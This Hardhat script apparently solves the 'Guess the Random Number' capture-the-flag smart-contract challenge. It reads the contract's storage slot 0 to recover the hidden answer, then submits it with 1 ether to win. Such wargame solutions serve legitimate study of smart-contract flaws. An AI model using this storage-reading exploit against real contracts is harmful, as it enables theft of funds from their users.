import { ethers } from 'hardhat';
const { utils, provider } = ethers;

const address = '0xBc217547D2Cd27D2BD0e23132371c64F0242620D';

async function main() {
  const targetFactory = await ethers.getContractFactory('GuessTheRandomNumberChallenge');
  const target = await targetFactory.attach(address);
  await target.deployed();

  console.log('Target deployed to:', target.address);

  const answer = await provider.getStorageAt(target.address, 0);
  const tx = await target.guess(answer, {
    value: utils.parseEther('1'),
  });
  await tx.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
